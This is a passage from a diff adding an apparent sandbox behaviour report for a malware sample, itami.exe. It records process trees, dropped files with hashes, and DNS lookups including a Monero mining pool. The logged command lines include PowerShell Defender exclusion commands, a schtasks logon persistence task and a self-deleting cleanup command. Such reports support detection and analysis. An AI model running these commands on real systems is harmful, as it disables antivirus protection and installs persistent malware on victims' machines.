+                              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                            }
+                          ]
+                        },
+                        {
+                          "process_id": "1500",
+                          "name": "C:\\Windows\\System32\\cmd.exe",
+                          "children": [
+                            {
+                              "process_id": "3328",
+                              "name": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+                              "children": [
+                                {
+                                  "process_id": "1368",
+                                  "name": "C:\\Windows\\System32\\cmd.exe",
+                                  "children": [
+                                    {
+                                      "process_id": "3808",
+                                      "name": "C:\\Windows\\System32\\schtasks.exe"
+                                    }
+                                  ]
+                                },
+                                {
+                                  "process_id": "1232",
+                                  "name": "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.exe"
+                                },
+                                {
+                                  "process_id": "3496",
+                                  "name": "C:\\Windows\\explorer.exe"
+                                },
+                                {
+                                  "process_id": "688",
+                                  "name": "C:\\Windows\\System32\\cmd.exe",
+                                  "children": [
+                                    {
+                                      "process_id": "2108",
+                                      "name": "C:\\Windows\\System32\\choice.exe"
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "process_id": "3728",
+                      "name": "C:\\Windows\\System32\\cmd.exe",
+                      "children": [
+                        {
+                          "process_id": "3136",
+                          "name": "C:\\Windows\\System32\\choice.exe"
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "process_id": "2380",
+      "name": "itami.exe",
+      "children": [
+        {
+          "process_id": "1472",
+          "time_offset": 20,
+          "name": "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Users\\<USER>\\Downloads\\itami.exe",
+          "children": [
+            {
+              "process_id": "2788",
+              "time_offset": 20,
+              "name": "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Users\\<USER>\\Downloads\\itami.exe",
+              "children": [
+                {
+                  "process_id": "2620",
+                  "time_offset": 28,
+                  "name": "C:\\Windows\\System32\\cmd.exe /C choice /C Y /N /D Y /T 3 & Del C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe",
+                  "children": [
+                    {
+                      "process_id": "2360",
+                      "time_offset": 32,
+                      "name": "choice /C Y /N /D Y /T 3"
+                    }
+                  ]
+                },
+                {
+                  "process_id": "2892",
+                  "time_offset": 26,
+                  "name": "C:\\Windows\\system32\\services64.exe",
+                  "children": [
+                    {
+                      "process_id": "2184",
+                      "time_offset": 44,
+                      "name": "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Windows\\system32\\services64.exe",
+                      "children": [
+                        {
+                          "process_id": "644",
+                          "time_offset": 44,
+                          "name": "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Windows\\system32\\services64.exe",
+                          "children": [
+                            {
+                              "process_id": "2116",
+                              "time_offset": 46,
+                              "name": "C:\\Windows\\system32\\Microsoft\\Libs\\sihost64.exe"
+                            },
+                            {
+                              "process_id": "2068",
+                              "time_offset": 45,
+                              "name": "C:\\Windows\\System32\\cmd.exe /c schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\" & exit",
+                              "children": [
+                                {
+                                  "process_id": "2964",
+                                  "time_offset": 46,
+                                  "name": "schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\""
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "process_id": "2316",
+                      "time_offset": 28,
+                      "name": "cmd /c powershell -Command Add-MpPreference -ExclusionPath %UserProfile% & powershell -Command Add-MpPreference -ExclusionPath %AppData% & powershell -Command Add-MpPreference -ExclusionPath %Temp% & powershell -Command Add-MpPreference -ExclusionPath %SystemRoot% & exit",
+                      "children": [
+                        {
+                          "process_id": "2288",
+                          "time_offset": 49,
+                          "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Windows"
+                        },
+                        {
+                          "process_id": "1192",
+                          "time_offset": 45,
+                          "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Local\\\\Temp"
+                        },
+                        {
+                          "process_id": "2912",
+                          "time_offset": 38,
+                          "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Roaming"
+                        },
+                        {
+                          "process_id": "1580",
+                          "time_offset": 31,
+                          "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\admin"
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "process_id": "1652",
+                  "time_offset": 21,
+                  "name": "C:\\Windows\\System32\\cmd.exe /c schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\" & exit",
+                  "children": [
+                    {
+                      "process_id": "772",
+                      "time_offset": 22,
+                      "name": "schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\""
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "process_id": "2688",
+          "time_offset": 3,
+          "name": "cmd /c powershell -Command Add-MpPreference -ExclusionPath %UserProfile% & powershell -Command Add-MpPreference -ExclusionPath %AppData% & powershell -Command Add-MpPreference -ExclusionPath %Temp% & powershell -Command Add-MpPreference -ExclusionPath %SystemRoot% & exit",
+          "children": [
+            {
+              "process_id": "2328",
+              "time_offset": 32,
+              "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Windows"
+            },
+            {
+              "process_id": "2400",
+              "time_offset": 20,
+              "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Local\\\\Temp"
+            },
+            {
+              "process_id": "2180",
+              "time_offset": 17,
+              "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Roaming"
+            },
+            {
+              "process_id": "2752",
+              "time_offset": 4,
+              "name": "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\admin"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "process_id": "3068",
+      "name": "'C:\\Users\\user\\Desktop\\itami.exe' ",
+      "children": [
+        {
+          "process_id": "6132",
+          "name": "C:\\Windows\\System32\\cmd.exe 'cmd' /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+          "children": [
+            {
+              "process_id": "616",
+              "name": "C:\\Windows\\System32\\conhost.exe C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+            },
+            {
+              "process_id": "4368",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user' "
+            },
+            {
+              "process_id": "7316",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user\\AppData\\Roaming' "
+            },
+            {
+              "process_id": "7884",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user\\AppData\\Local\\Temp' "
+            },
+            {
+              "process_id": "5496",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Windows' "
+            }
+          ]
+        },
+        {
+          "process_id": "1868",
+          "name": "'C:\\Windows\\System32\\cmd.exe' /c C:\\Users\\user\\AppData\\Local\\Temp\\svchost64.exe 'C:\\Users\\user\\Desktop\\itami.exe'",
+          "children": [
+            {
+              "process_id": "3428",
+              "name": "C:\\Windows\\System32\\conhost.exe C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+            },
+            {
+              "process_id": "3052",
+              "name": "C:\\Users\\user\\AppData\\Local\\Temp\\svchost64.exe  'C:\\Users\\user\\Desktop\\itami.exe'",
+              "children": [
+                {
+                  "process_id": "760",
+                  "name": "'C:\\Windows\\System32\\cmd.exe' /c schtasks /create /f /sc onlogon /rl highest /tn 'services64' /tr ''C:\\Windows\\system32\\services64.exe'' & exit",
+                  "children": [
+                    {
+                      "process_id": "4324",
+                      "name": "C:\\Windows\\System32\\conhost.exe C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+                    },
+                    {
+                      "process_id": "6904",
+                      "name": "C:\\Windows\\System32\\schtasks.exe schtasks  /create /f /sc onlogon /rl highest /tn 'services64' /tr ''C:\\Windows\\system32\\services64.exe'' "
+                    }
+                  ]
+                },
+                {
+                  "process_id": "5796",
+                  "name": "C:\\Windows\\System32\\services64.exe 'C:\\Windows\\system32\\services64.exe' ",
+                  "children": [
+                    {
+                      "process_id": "6972",
+                      "name": "C:\\Windows\\System32\\cmd.exe 'cmd' /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+                      "children": [
+                        {
+                          "process_id": "6012",
+                          "name": "C:\\Windows\\System32\\conhost.exe C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+                        },
+                        {
+                          "process_id": "7016",
+                          "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user' "
+                        },
+                        {
+                          "process_id": "7740",
+                          "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user\\AppData\\Roaming' "
+                        },
+                        {
+                          "process_id": "3528",
+                          "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user\\AppData\\Local\\Temp' "
+                        },
+                        {
+                          "process_id": "7544",
+                          "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Windows' "
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "process_id": "940",
+                  "name": "'C:\\Windows\\System32\\cmd.exe' /C choice /C Y /N /D Y /T 3 & Del 'C:\\Users\\user\\AppData\\Local\\Temp\\svchost64.exe'",
+                  "children": [
+                    {
+                      "process_id": "3412",
+                      "name": "C:\\Windows\\System32\\conhost.exe C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+                    },
+                    {
+                      "process_id": "4120",
+                      "name": "C:\\Windows\\System32\\choice.exe choice  /C Y /N /D Y /T 3 "
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "process_id": "4",
+      "name": "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{FB98DDB0-12A6-4219-939B-AA32BC351C9C}\\MpKslDrv.sys"
+    },
+    {
+      "process_id": "3724",
+      "name": "C:\\Windows\\System32\\services64.exe C:\\Windows\\system32\\services64.exe",
+      "children": [
+        {
+          "process_id": "5588",
+          "name": "C:\\Windows\\System32\\cmd.exe 'cmd' /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+          "children": [
+            {
+              "process_id": "1872",
+              "name": "C:\\Windows\\System32\\conhost.exe C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+            },
+            {
+              "process_id": "3852",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user' "
+            },
+            {
+              "process_id": "7664",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user\\AppData\\Roaming' "
+            },
+            {
+              "process_id": "1440",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\user\\AppData\\Local\\Temp' "
+            },
+            {
+              "process_id": "7644",
+              "name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Windows' "
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "calls_highlighted": [
+    "GetTickCount",
+    "IsDebuggerPresent",
+    "GetSystemMetrics",
+    "GetAdaptersAddresses",
+    "ExecQueryWmi"
+  ],
+  "files_copied": [
+    {
+      "source": "C:\\Users\\<USER>\\Downloads\\itami.exe",
+      "destination": "C:\\Windows\\system32\\services64.exe"
+    }
+  ],
+  "verdicts": [
+    "MALWARE"
+  ],
+  "ja3_digests": [
+    "1074895078955b2db60423ed2bf8ac23"
+  ],
+  "files_written": [
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\r40wd1kx.3kv.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\31tuusg3.opk.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\50excb03.oo4.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\l5ol3ivj.0yo.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\vfmqars4.i5d.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\qlkiyw23.tqd.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\ajw4on02.cnf.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\xk0qlqrr.amv.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\gics3x1t.y3b.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\zf1sh221.kgw.psm1",
+    "C:\\Windows\\system32\\Microsoft\\Libs\\sihost64.exe",
+    "C:\\Windows\\system32\\Microsoft\\Libs\\WR64.sys",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\o5dsdqgu.otp.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\2fd0qk2j.4tw.psm1",
+    "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\UPnP Device Host\\upnphost\\udhisapi.dll",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\r40wd1kx.3kv.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\50excb03.oo4.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe",
+    "C:\\Windows\\System32\\services64.exe",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\vfmqars4.i5d.ps1",
+    "C:\\Windows\\System32\\Tasks\\services64",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\itami.exe.log",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\services64.exe.log",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\svchost64.exe.log",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Caches",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dezdqqbs.0iy.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ehwww3j4.nwj.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ksnrixfy.zsj.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpnen4uo.0jd.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_urbqvbub.fom.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_z2p22j2q.23w.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\svchost64.exe",
+    "C:\\Users\\user\\AppData\\Roaming",
+    "C:\\Users\\user\\Documents\\20211002",
+    "C:\\Users\\user\\Documents\\20211002\\PowerShell_transcript.648351.JPLGNUq3.20211002124253.txt",
+    "C:\\Users\\user\\Documents\\20211002\\PowerShell_transcript.648351.avyG4ev3.20211002124252.txt",
+    "C:\\Users\\user\\Documents\\20211002\\PowerShell_transcript.648351.wlpxO+wY.20211002124243.txt",
+    "C:\\Windows\\System32\\services64.exe",
+    "C:\\Windows\\System32\\services64.exe:Zone.Identifier",
+    "C:\\Windows\\System32\\services64.exe\\:Zone.Identifier:$DATA",
+    "C:\\Windows\\system32\\catroot",
+    "C:\\Windows\\system32\\catroot2",
+    "C:\\Windows\\system32\\services64.exe",
+    "\\Device\\ConDrv\\\\Connect"
+  ],
+  "verdict_confidence": 50,
+  "files_deleted": [
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_szru5clb.hz1.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uziie1be.o3w.psm1",
+    "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bxbbqyn1.42q.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zd5wo1bl.0s4.psm1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1cnfgxx4.j3z.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vxbypyzm.i0l.psm1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ptqjarqv.vxa.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0u55w3yq.ahp.psm1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_impxnvm2.iu4.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cmb001lx.5jn.psm1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1w5qmr2u.zhw.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ofm3i11t.j3o.psm1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_duzasj3i.aja.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_iuhb3i03.hko.psm1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_acgbo4m5.cgl.ps1",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tb1memd2.3ud.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\r40wd1kx.3kv.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\31tuusg3.opk.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\50excb03.oo4.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\l5ol3ivj.0yo.psm1",
+    "C:\\Windows\\system32\\Microsoft\\Libs\\sihost64.log",
+    "C:\\Windows\\system32\\Microsoft\\Libs\\sihost64-2.log",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\vfmqars4.i5d.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\qlkiyw23.tqd.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\ajw4on02.cnf.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\xk0qlqrr.amv.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\gics3x1t.y3b.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\zf1sh221.kgw.psm1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\o5dsdqgu.otp.ps1",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\2fd0qk2j.4tw.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dezdqqbs.0iy.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ehwww3j4.nwj.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ksnrixfy.zsj.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpnen4uo.0jd.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_urbqvbub.fom.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_z2p22j2q.23w.psm1"
+  ],
+  "dns_lookups": [
+    {
+      "resolved_ips": [
+        "185.65.135.234"
+      ],
+      "hostname": "sanctam.net"
+    },
+    {
+      "resolved_ips": [
+        "104.192.141.1"
+      ],
+      "hostname": "bitbucket.org"
+    },
+    {
+      "resolved_ips": [
+        "135.125.238.108",
+        "51.255.34.118",
+        "51.15.54.102",
+        "185.71.66.31",
+        "51.15.58.224",
+        "46.105.31.147",
+        "51.15.78.68",
+        "51.68.143.81",
+        "217.182.169.148",
+        "51.83.33.228",
+        "51.15.65.182",
+        "51.15.69.136"
+      ],
+      "hostname": "xmr-eu1.nanopool.org"
+    },
+    {
+      "resolved_ips": [
+        "185.65.135.234"
+      ],
+      "hostname": "sanctam.net"
+    },
+    {
+      "resolved_ips": [
+        "104.192.141.1"
+      ],
+      "hostname": "bitbucket.org"
+    }
+  ],
+  "files_dropped": [
+    {
+      "path": "%windir%\\system32\\Microsoft\\Libs\\sihost64.exe",
+      "sha256": "4e83dda2631f12a8ee4f6996fe6144d6016f7583c79ea6672a2b6d5c4b530006"
+    },
+    {
+      "path": "%TEMP%\\svchost64.exe",
+      "sha256": "b2a887dbada2082a7e0a8bcbf4294a0970ce52eb65e50569b2b0ef413f7f7e58"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_szru5clb.hz1.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uziie1be.o3w.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bxbbqyn1.42q.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zd5wo1bl.0s4.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1cnfgxx4.j3z.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vxbypyzm.i0l.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ptqjarqv.vxa.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0u55w3yq.ahp.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe.log"
+    },
+    {
+      "path": "C:\\Windows\\System32\\services64.exe"
+    },
+    {
+      "path": "C:\\Windows\\System32\\Tasks\\services64"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\svchost64.exe.log"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_impxnvm2.iu4.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cmb001lx.5jn.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1w5qmr2u.zhw.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ofm3i11t.j3o.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_duzasj3i.aja.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_iuhb3i03.hko.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_acgbo4m5.cgl.ps1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tb1memd2.3ud.psm1"
+    },
+    {
+      "path": "%USERPROFILE%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\services64.exe.log"
+    },
+    {
+      "path": "C:\\Windows\\System32\\Microsoft\\Libs"
+    },
+    {
+      "path": "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.exe"
+    },
+    {
+      "path": "C:\\Windows\\System32\\Microsoft\\Libs\\WR64.sys"
+    },
+    {
+      "path": "C:\\Windows\\System32\\Microsoft\\Libs\\sihost64.log"
+    },
+    {
+      "path": "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe",
+      "sha256": "b2a887dbada2082a7e0a8bcbf4294a0970ce52eb65e50569b2b0ef413f7f7e58"
+    },
+    {
+      "path": "C:\\Windows\\system32\\Microsoft\\Libs\\sihost64.exe",
+      "sha256": "4e83dda2631f12a8ee4f6996fe6144d6016f7583c79ea6672a2b6d5c4b530006"
+    },
+    {
+      "path": "C:\\Windows\\system32\\Microsoft\\Libs\\WR64.sys",
+      "sha256": "11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\itami.exe.log",
+      "sha256": "e3c87716559caa8d132753a9644a6645de391c1f4161c2c087d89979bf35bab8",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\services64.exe.log",
+      "sha256": "e3c87716559caa8d132753a9644a6645de391c1f4161c2c087d89979bf35bab8",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\svchost64.exe.log",
+      "sha256": "84ab172263e61ffeb4602deb6b0c1b7379b2fa8635d0eaed341ffac50e40949d",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0patdpio.3xx.psm1",
+      "sha256": "9ffb57f0545b65e27c09890a5a03dcf90daac0b9393ef5925f7b362e533ec837",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1uvbzlrc.opf.ps1",
+      "sha256": "9ffb57f0545b65e27c09890a5a03dcf90daac0b9393ef5925f7b362e533ec837",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_31iylmzs.xxt.psm1",
+      "sha256": "7ef9fef9bd41021e9b684e72dbd4971e48dc64bb8f0a6736735c2288d2502492",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4asclr2o.yt4.ps1",
+      "sha256": "8bec218a699dbc7f8f540e0ff62601628e9b0dfcd4d05f2882c1ee4f0b7bd78c",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_5phsv3jl.ami.ps1",
+      "sha256": "3ecfb0138847f1fa808de17e84faf8d906b5d8cf9a1900c60e7544748965d2d3",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_a3aznfqy.lzr.psm1",
+      "sha256": "115453343e898072f0b6533f3be55b64254b953d0288f2f870baf3d1e0a9266e",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bh4qr0kn.0ze.psm1",
+      "sha256": "d2eb1f13dfbd6204b4ca67aa7a79df8f9510ea9291b7e7eb8edf22d564fbeb50",
+      "type": "TEXT"
+    },
+    {
+      "path": "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dezdqqbs.0iy.ps1",
+      "sha256": "7daf7c08b5eac7d29a0b9a7515095eaa7946b7fd143acbf6c5e77f888455e152",
+      "type": "TEXT"
+    },
+    {
